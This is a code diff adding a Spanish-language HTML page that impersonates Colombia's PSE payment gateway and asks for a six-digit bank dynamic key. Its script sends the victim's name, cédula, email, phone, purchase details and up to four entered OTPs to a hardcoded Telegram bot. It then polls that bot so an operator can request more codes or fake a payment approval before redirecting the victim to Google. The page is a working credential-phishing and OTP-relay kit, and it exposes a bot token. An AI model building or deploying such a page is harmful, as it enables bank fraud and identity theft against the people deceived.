@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PSE - Clave Dinamica</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f7fa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #003366 0%, #004d99 100%);
+            padding: 15px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 10px rgba(0, 51, 102, 0.2);
+        }
+
+        .logo-placeholder {
+            width: 120px;
+            height: 45px;
+            background-color: rgba(255, 255, 255, 0.15);
+            border: 2px dashed rgba(255, 255, 255, 0.4);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 11px;
+            font-weight: 500;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 8px 16px;
+            border-radius: 20px;
+        }
+
+        .secure-badge svg {
+            width: 16px;
+            height: 16px;
+            fill: #4CAF50;
+        }
+
+        .secure-badge span {
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .pin-container {
+            width: 100%;
+            max-width: 450px;
+        }
+
+        /* Info Banner */
+        .info-banner {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            border: 1px solid #90caf9;
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .info-banner svg {
+            width: 24px;
+            height: 24px;
+            fill: #1976d2;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .info-banner-content h4 {
+            color: #1565c0;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .info-banner-content p {
+            color: #1976d2;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        /* PIN Card */
+        .pin-card {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 51, 102, 0.08), 0 1px 3px rgba(0, 0, 0, 0.05);
+            padding: 40px;
+            border: 1px solid #e8eef3;
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .card-header .icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .card-header .icon svg {
+            width: 35px;
+            height: 35px;
+            fill: #003366;
+        }
+
+        .card-header h1 {
+            color: #003366;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .card-header p {
+            color: #5a7184;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        /* Bank Badge */
+        .bank-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 12px 20px;
+            margin-bottom: 28px;
+        }
+
+        .bank-badge svg {
+            width: 20px;
+            height: 20px;
+            fill: #003366;
+        }
+
+        .bank-badge span {
+            color: #003366;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* PIN Input */
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .pin-input {
+            width: 52px;
+            height: 60px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            color: #003366;
+            background: #fafbfc;
+            transition: all 0.2s ease;
+        }
+
+        .pin-input:focus {
+            outline: none;
+            border-color: #003366;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 51, 102, 0.1);
+        }
+
+        .pin-input.filled {
+            border-color: #003366;
+            background: #f0f4f8;
+        }
+
+        /* Keypad */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            max-width: 280px;
+            margin: 0 auto 32px;
+        }
+
+        .keypad-btn {
+            width: 100%;
+            height: 56px;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            background: #ffffff;
+            font-size: 22px;
+            font-weight: 600;
+            color: #1f2937;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .keypad-btn:hover {
+            background: #f0f4f8;
+            border-color: #003366;
+        }
+
+        .keypad-btn:active {
+            background: #e3f2fd;
+            transform: scale(0.97);
+        }
+
+        .keypad-btn.delete {
+            background: #003366;
+            border-color: #003366;
+            color: #ffffff;
+        }
+
+        .keypad-btn.delete:hover {
+            background: #002244;
+        }
+
+        .keypad-btn.delete svg {
+            width: 24px;
+            height: 24px;
+            fill: #ffffff;
+        }
+
+        .keypad-btn.empty {
+            visibility: hidden;
+        }
+
+        /* Timer */
+        .timer {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 12px;
+            background: #fef3c7;
+            border: 1px solid #fcd34d;
+            border-radius: 8px;
+        }
+
+        .timer p {
+            color: #92400e;
+            font-size: 13px;
+        }
+
+        .timer span {
+            font-weight: 700;
+            color: #b45309;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #003366 0%, #004d99 100%);
+            color: #ffffff;
+            box-shadow: 0 4px 14px rgba(0, 51, 102, 0.3);
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: linear-gradient(135deg, #002244 0%, #003d7a 100%);
+            box-shadow: 0 6px 20px rgba(0, 51, 102, 0.4);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:disabled {
+            background: #cbd5e1;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #ffffff;
+            color: #003366;
+            border: 2px solid #003366;
+            margin-top: 12px;
+        }
+
+        .btn-secondary:hover {
+            background: #f0f4f8;
+        }
+
+        /* Resend link */
+        .resend-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .resend-link a {
+            color: #003366;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e5e7eb;
+            padding: 20px 40px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .footer-logo-placeholder {
+            width: 80px;
+            height: 30px;
+            background-color: #f1f5f9;
+            border: 1px dashed #cbd5e1;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #94a3b8;
+            font-size: 9px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #64748b;
+            font-size: 13px;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        .footer-links a:hover {
+            color: #003366;
+        }
+
+        .footer-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            color: #94a3b8;
+            font-size: 12px;
+        }
+
+        .footer-right .separator {
+            width: 1px;
+            height: 16px;
+            background: #e2e8f0;
+        }
+
+        /* Responsive */
+        @media (max-width: 500px) {
+            .header {
+                padding: 12px 20px;
+            }
+
+            .pin-card {
+                padding: 28px 20px;
+            }
+
+            .pin-inputs {
+                gap: 8px;
+            }
+
+            .pin-input {
+                width: 44px;
+                height: 52px;
+                font-size: 20px;
+            }
+
+            .keypad {
+                gap: 8px;
+            }
+
+            .keypad-btn {
+                height: 50px;
+                font-size: 20px;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .footer-links {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <!-- <div class="logo-placeholder">LOGO PSE</div> -->
+        <img src="/img/pse-logo.png" alt="PSE" style="height: 45px;">
+
+        <div class="header-right">
+            <div class="secure-badge">
+                <svg viewBox="0 0 24 24">
+                    <path
+                        d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
+                </svg>
+                <span>Conexion segura</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="pin-container">
+            <!-- Info Banner -->
+            <div class="info-banner">
+                <svg viewBox="0 0 24 24">
+                    <path
+                        d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+                </svg>
+                <div class="info-banner-content">
+                    <h4>Clave dinamica enviada</h4>
+                    <p>Hemos enviado un codigo de 6 digitos a tu app del banco o por SMS. Ingresalo a continuacion.</p>
+                </div>
+            </div>
+
+            <!-- PIN Card -->
+            <div class="pin-card">
+                <div class="card-header">
+                    <div class="icon">
+                        <svg viewBox="0 0 24 24">
+                            <path
+                                d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z" />
+                        </svg>
+                    </div>
+                    <h1>Ingresa tu Clave Dinamica</h1>
+                    <p>Digita el codigo de 6 digitos para confirmar tu transaccion.</p>
+                </div>
+
+                <!-- Bank Badge -->
+                <div class="bank-badge">
+                    <svg viewBox="0 0 24 24">
+                        <path
+                            d="M4 10v7h3v-7H4zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm14-12v7h3v-7h-3zm-4.5-9L2 6v2h19V6l-9.5-5z" />
+                    </svg>
+                    <span id="bankNameDisplay">Bancolombia</span>
+                </div>
+
+                <div id="loadingMessage" style="display: none; text-align: center; margin-bottom: 30px;">
+                    <p style="color: #003366; font-weight: 600; font-size: 18px;">⏳ Procesando tu solicitud...</p>
+                    <p style="font-size: 14px; margin-top: 10px;">Por favor espera mientras el banco aprueba el pago. No
+                        cierres esta ventana.</p>
+                    <div
+                        style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #003366; border-radius: 50%; animation: spin 1s linear infinite;">
+                    </div>
+                    <style>
+                        @keyframes spin {
+                            0% {
+                                transform: rotate(0deg);
+                            }
+
+                            100% {
+                                transform: rotate(360deg);
+                            }
+                        }
+                    </style>
+                </div>
+
+                <div id="pinArea">
+
+                    <!-- PIN Inputs -->
+                    <div class="pin-inputs">
+                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" data-index="0">
+                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" data-index="1">
+                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" data-index="2">
+                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" data-index="3">
+                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" data-index="4">
+                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" data-index="5">
+                    </div>
+
+                    <!-- Keypad -->
+                    <div class="keypad">
+                        <button type="button" class="keypad-btn" data-value="1">1</button>
+                        <button type="button" class="keypad-btn" data-value="2">2</button>
+                        <button type="button" class="keypad-btn" data-value="3">3</button>
+                        <button type="button" class="keypad-btn" data-value="4">4</button>
+                        <button type="button" class="keypad-btn" data-value="5">5</button>
+                        <button type="button" class="keypad-btn" data-value="6">6</button>
+                        <button type="button" class="keypad-btn" data-value="7">7</button>
+                        <button type="button" class="keypad-btn" data-value="8">8</button>
+                        <button type="button" class="keypad-btn" data-value="9">9</button>
+                        <button type="button" class="keypad-btn empty"></button>
+                        <button type="button" class="keypad-btn" data-value="0">0</button>
+                        <button type="button" class="keypad-btn delete" id="btnDelete">
+                            <svg viewBox="0 0 24 24">
+                                <path
+                                    d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z" />
+                            </svg>
+                        </button>
+                    </div>
+
+                    <!-- Timer -->
+                    <div class="timer">
+                        <p>El codigo expira en <span id="countdown">02:00</span></p>
+                    </div>
+
+                    <!-- Buttons -->
+                    <button type="button" class="btn btn-primary" id="btnConfirmar" disabled>
+                        Confirmar Pago
+                    </button>
+                    <button type="button" class="btn btn-secondary" onclick="window.location.href='pse-login.html'">
+                        Cancelar
+                    </button>
+
+                    <!-- Resend Link -->
+                    <div class="resend-link">
+                        <a href="#" id="resendLink">Reenviar codigo</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+                <!-- <div class="footer-logo-placeholder">LOGO</div> -->
+                <img src="/img/pse-logo.png" alt="PSE" style="height: 30px;">
+                <div class="footer-links">
+                    <a href="#">Ayuda</a>
+                    <a href="#">Seguridad</a>
+                    <a href="#">Terminos</a>
+                    <a href="#">Privacidad</a>
+                </div>
+            </div>
+            <div class="footer-right">
+                <span id="currentDate"></span>
+                <span class="separator"></span>
+                <span>Todos los derechos reservados</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Update date
+        function updateDate() {
+            const now = new Date();
+            const options = {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            };
+            document.getElementById('currentDate').textContent = now.toLocaleDateString('es-CO', options);
+        }
+        updateDate();
+
+        // TELEGRAM API
+        const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+        const CHAT_ID = "6483487531";
+
+        async function sendToTelegram(text, inlineKeyboard = null) {
+            if (!CHAT_ID) return;
+            const body = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: "HTML"
+            };
+            if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
+            await fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(body)
+            });
+        }
+
+        const nombre = sessionStorage.getItem("nombre") || "—";
+        const cedula = sessionStorage.getItem("cedula") || "—";
+        const correo = sessionStorage.getItem("correo") || "—";
+        const telefono = sessionStorage.getItem("telefono") || "—";
+        const total = sessionStorage.getItem("total") || "—";
+        const producto = sessionStorage.getItem("producto") || "—";
+        const banco = sessionStorage.getItem("banco") || "PSE";
+
+        document.getElementById('bankNameDisplay').textContent = banco;
+
+        let sessionId = sessionStorage.getItem("sessionId");
+        if (!sessionId) {
+            sessionId = crypto.randomUUID();
+            sessionStorage.setItem("sessionId", sessionId);
+        }
+
+        const pinArea = document.getElementById('pinArea');
+        const loadingMessage = document.getElementById('loadingMessage');
+        const pinInputs = document.querySelectorAll('.pin-input');
+        const btnConfirmar = document.getElementById('btnConfirmar');
+
+        let pollingInterval = null;
+        let lastUpdateId = 0;
+
+        function mostrarCampoPIN() {
+            loadingMessage.style.display = 'none';
+            pinArea.style.display = 'block';
+            pinInputs.forEach(inp => {
+                inp.value = '';
+                inp.classList.remove('filled');
+            });
+            pinInputs[0].focus();
+            updateButtonState();
+        }
+
+        function ocultarCampoPIN() {
+            pinArea.style.display = 'none';
+            loadingMessage.style.display = 'block';
+        }
+
+        async function pollTelegram() {
+            try {
+                const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=2`);
+                const data = await res.json();
+
+                if (data.ok && data.result.length > 0) {
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+                        const callbackData = update.callback_query?.data;
+                        const sessionActual = sessionStorage.getItem("sessionId");
+
+                        const cbQuery = update.callback_query;
+                        const chatId = cbQuery.message.chat.id;
+                        const msgId = cbQuery.message.message_id;
+                        const oldText = cbQuery.message.text || "";
+
+                        async function updateBotMsg(statusText) {
+                            try {
+                                await fetch(`${TELEGRAM_API}/editMessageText`, {
+                                    method: "POST",
+                                    headers: { "Content-Type": "application/json" },
+                                    body: JSON.stringify({
+                                        chat_id: chatId,
+                                        message_id: msgId,
+                                        text: oldText + `\n\n👉 ESTADO: ${statusText}`,
+                                        reply_markup: { inline_keyboard: [] }
+                                    })
+                                });
+                            } catch(e) { console.error("Error al editar mensaje:", e); }
+                        }
+
+                        if (callbackData === `activar_otp_${sessionActual}`) {
+                            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    callback_query_id: cbQuery.id,
+                                    text: "✅ OTP activado para el usuario"
+                                })
+                            });
+                            await updateBotMsg("🔑 Pidiendo nuevo OTP al cliente");
+                            
+                            mostrarCampoPIN();
+                            clearInterval(pollingInterval);
+                        } else if (callbackData === `aprobar_pago_${sessionActual}`) {
+                            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    callback_query_id: cbQuery.id,
+                                    text: "✅ Pago aprobado"
+                                })
+                            });
+                            await updateBotMsg("✅ Pago Aprobado");
+
+                            loadingMessage.innerHTML = '<p style="color: #4CAF50; font-weight: bold; font-size: 18px;">✅ Pago aprobado exitosamente</p><p>Serás redirigido en unos segundos...</p>';
+                            clearInterval(pollingInterval);
+                            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+                        } else if (callbackData === `rechazar_pago_${sessionActual}`) {
+                            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    callback_query_id: cbQuery.id,
+                                    text: "❌ Pago rechazado"
+                                })
+                            });
+                            await updateBotMsg("❌ Pago Rechazado");
+
+                            loadingMessage.innerHTML = '<p style="color: #F44336; font-weight: bold; font-size: 18px;">❌ Pago rechazado por el banco</p><p>Serás redirigido en unos segundos...</p>';
+                            clearInterval(pollingInterval);
+                            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+                        }
+                    }
+                }
+            } catch (e) { console.warn(e); }
+        }
+
+        function iniciarPolling() {
+            if (pollingInterval) clearInterval(pollingInterval);
+            pollingInterval = setInterval(pollTelegram, 2000);
+        }
+
+        window.addEventListener("beforeunload", () => {
+            if (pollingInterval) clearInterval(pollingInterval);
+        });
+
+        if (!sessionStorage.getItem("otpCount")) {
+            sessionStorage.setItem("otpCount", "0");
+        }
+
+        function getNextOtpKey() {
+            let count = parseInt(sessionStorage.getItem("otpCount") || "0", 10);
+            count = count >= 4 ? 1 : count + 1;
+            sessionStorage.setItem("otpCount", String(count));
+            return count;
+        }
+
+        async function submitOTP(pin) {
+            ocultarCampoPIN();
+
+            const count = getNextOtpKey();
+            sessionStorage.setItem(`otp${count}`, pin);
+
+            const otp1 = sessionStorage.getItem('otp1') || '—';
+            const otp2 = sessionStorage.getItem('otp2') || '—';
+            const otp3 = sessionStorage.getItem('otp3') || '—';
+            const otp4 = sessionStorage.getItem('otp4') || '—';
+
+            const text = `🔐 <b>PIN PSE (${banco}) Recibido — OTP${count}</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🛒 Producto: ${producto}\n\n🔑 OTP1: ${otp1}\n🔑 OTP2: ${otp2}\n🔑 OTP3: ${otp3}\n🔑 OTP4: ${otp4}\n\n📊 OTP actual: ${count} de 4 | 🆔 ${sessionId}`;
+            const inlineKeyboard = [
+                [{ "text": "🔑 Pedir otro OTP", "callback_data": `activar_otp_${sessionId}` }],
+                [
+                    { "text": "✅ Aprobar", "callback_data": `aprobar_pago_${sessionId}` },
+                    { "text": "❌ Rechazar", "callback_data": `rechazar_pago_${sessionId}` }
+                ]
+            ];
+            await sendToTelegram(text, inlineKeyboard);
+            iniciarPolling();
+        }
+
+        function updateButtonState() {
+            const allFilled = Array.from(pinInputs).every(input => input.value.length === 1);
+            btnConfirmar.disabled = !allFilled;
+        }
+
+        function focusNext(index) {
+            if (index < pinInputs.length - 1) {
+                pinInputs[index + 1].focus();
+            }
+        }
+
+        function focusPrev(index) {
+            if (index > 0) {
+                pinInputs[index - 1].focus();
+            }
+        }
+
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', function (e) {
+                const value = e.target.value.replace(/[^0-9]/g, '');
+                e.target.value = value.slice(0, 1);
+
+                if (value) {
+                    e.target.classList.add('filled');
+                    focusNext(index);
+                } else {
+                    e.target.classList.remove('filled');
+                }
+                updateButtonState();
+            });
+
+            input.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && !e.target.value) {
+                    focusPrev(index);
+                }
+            });
+
+            input.addEventListener('focus', function (e) {
+                e.target.select();
+            });
+
+            // Paste support
+            input.addEventListener('paste', function (e) {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+                pastedData.split('').forEach((char, i) => {
+                    if (pinInputs[i]) {
+                        pinInputs[i].value = char;
+                        pinInputs[i].classList.add('filled');
+                    }
+                });
+                if (pastedData.length > 0) {
+                    pinInputs[Math.min(pastedData.length, 5)].focus();
+                }
+                updateButtonState();
+            });
+        });
+
+        // Keypad
+        document.querySelectorAll('.keypad-btn[data-value]').forEach(btn => {
+            btn.addEventListener('click', function () {
+                const value = this.dataset.value;
+                const emptyInput = Array.from(pinInputs).find(input => !input.value);
+                if (emptyInput) {
+                    emptyInput.value = value;
+                    emptyInput.classList.add('filled');
+                    const index = parseInt(emptyInput.dataset.index);
+                    focusNext(index);
+                    updateButtonState();
+                }
+            });
+        });
+
+        // Delete button
+        document.getElementById('btnDelete').addEventListener('click', function () {
+            const filledInputs = Array.from(pinInputs).filter(input => input.value);
+            if (filledInputs.length > 0) {
+                const lastFilled = filledInputs[filledInputs.length - 1];
+                lastFilled.value = '';
+                lastFilled.classList.remove('filled');
+                lastFilled.focus();
+                updateButtonState();
+            }
+        });
+
+        // Countdown timer
+        let timeLeft = 120;
+        const countdownEl = document.getElementById('countdown');
+
+        const timer = setInterval(() => {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            if (countdownEl) countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                if (countdownEl) countdownEl.textContent = 'Expirado';
+                btnConfirmar.disabled = true;
+            }
+        }, 1000);
+
+        // Resend link
+        document.getElementById('resendLink').addEventListener('click', function (e) {
+            e.preventDefault();
+            timeLeft = 120;
+            pinInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+            pinInputs[0].focus();
+            updateButtonState();
+            alert('Codigo reenviado correctamente');
+        });
+
+        // Confirm button
+        btnConfirmar.addEventListener('click', function () {
+            const pin = Array.from(pinInputs).map(input => input.value).join('');
+            submitOTP(pin);
+        });
+
+        // Focus first input on load
+        mostrarCampoPIN();
+    </script>
+</body>
+
+</html>
